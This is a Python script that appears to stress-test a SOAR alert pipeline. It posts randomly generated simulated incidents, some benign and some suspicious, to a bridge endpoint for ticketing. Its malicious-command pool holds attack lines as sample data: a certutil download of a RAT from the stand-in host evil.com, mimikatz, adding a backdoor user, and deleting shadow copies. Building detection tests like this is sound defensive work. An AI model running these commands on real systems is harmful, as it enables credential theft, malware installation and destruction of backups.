import os
import requests
import uuid
import time
import random
import sys

# Connect to the Bridge
BRIDGE_URL = os.getenv("BRIDGE_URL", "http://soar-bridge:8000/alert")

# --- DATA POOLS FOR RANDOM GENERATION ---

KNOWN_ASSETS = [
    {"host": "dxb-sql-prod", "ip": "10.0.5.5", "type": "CRITICAL"},      # Case 1
    {"host": "uae-cloud-gateway", "ip": "10.0.80.50", "type": "HIGH"},  # Case 2
    {"host": "hr-desktop-user", "ip": "192.168.1.102", "type": "LOW"},  # Case 3
]

RANDOM_ASSETS = [
    {"host": "mkt-laptop-01", "ip": "192.168.5.50"},
    {"host": "dev-server-09", "ip": "172.16.0.99"},
    {"host": "guest-wifi-user", "ip": "10.20.20.1"}
]

# MALICIOUS COMMANDS (Triggers: Highest/High -> Slack)
BAD_CMDS = [
    "powershell -enc JABzID0gTmV3LU9i...",
    "mimikatz.exe privilege::debug",
    "certutil.exe -urlcache -split -f http://evil.com/rat.exe",
    "net user /add hacker Password123!",
    "vssadmin delete shadows /all /quiet"
]

# AUTHORIZED/BENIGN COMMANDS (Triggers: Archive or Low)
GOOD_CMDS = [
    "curl -X POST https://api.backup.uae -u system_service",
    "ping google.com",
    "chkdsk /f C:",
    "update_agent.exe --status"
]

# SUSPICIOUS COMMANDS (Triggers: Medium -> Manual Review)
SUS_CMDS = [
    "whoami /priv",
    "netstat -an | findstr 4444",
    "powershell.exe -Command Get-Process",
    "dir /S C:\\Users\\Administrator"
]

def generate_random_alert():
    # 1. Flip a coin to choose the Scenario Type
    # 20% Authorized (Backup), 40% Malicious, 40% Suspicious
    scenario_type = random.choice(["SAFE", "BAD", "BAD", "SUS", "SUS"])
    
    # 2. Pick Asset (Mix of known criticals and randoms)
    if scenario_type == "SAFE":
        # Force the Gateway for the specific whitelist policy
        asset = KNOWN_ASSETS[1] 
        cmd = GOOD_CMDS[0] # The approved curl command
        severity = "Info"
    else:
        # Pick any asset
        asset = random.choice(KNOWN_ASSETS + RANDOM_ASSETS)
        
        if scenario_type == "BAD":
            cmd = random.choice(BAD_CMDS)
            severity = "High"
        else: # SUS
            cmd = random.choice(SUS_CMDS)
            severity = "Medium"

    payload = {
        "event_id": str(uuid.uuid4()),
        "hostname": asset['host'],
        "ip_address": asset['ip'],
        "command": cmd,
        "severity": severity,
        "description": f"AUTO-GEN {scenario_type} SIMULATION"
    }
    return payload, scenario_type

def start_stress_test(count):
    print(f"\n[🚀] STARTING CONTINUOUS SIMULATION: {count} INCIDENTS\n")
    print(f"Targeting: {BRIDGE_URL}")
    print("--------------------------------------------------")

    for i in range(1, count + 1):
        payload, s_type = generate_random_alert()
        
        print(f"\n[{i}/{count}] SENDING [{s_type}] from {payload['hostname']}...")
        
        try:
            r = requests.post(BRIDGE_URL, json=payload, timeout=60)
            if r.status_code == 200:
                print(f" > ✅ Jira Key: {r.json().get('ticket')}")
                if "transitioned to ARCHIVED" in str(r.content):
                    print(" > ♻️ SELF-HEALED (Archived)")
            else:
                print(f" > 🔴 FAILED: {r.status_code}")
        except Exception as e:
            print(f" > ⚠️ TIMEOUT/ERROR: {e}")

        # RANDOM SLEEP to simulate real traffic variance (and protect API limits)
        wait_time = random.randint(5, 12)
        print(f"   (Waiting {wait_time}s for Analyst cooldown...)")
        time.sleep(wait_time)

if __name__ == "__main__":
    # Default to 10 incidents, or accept user input
    total = int(sys.argv[1]) if len(sys.argv) > 1 else 10
    start_stress_test(total)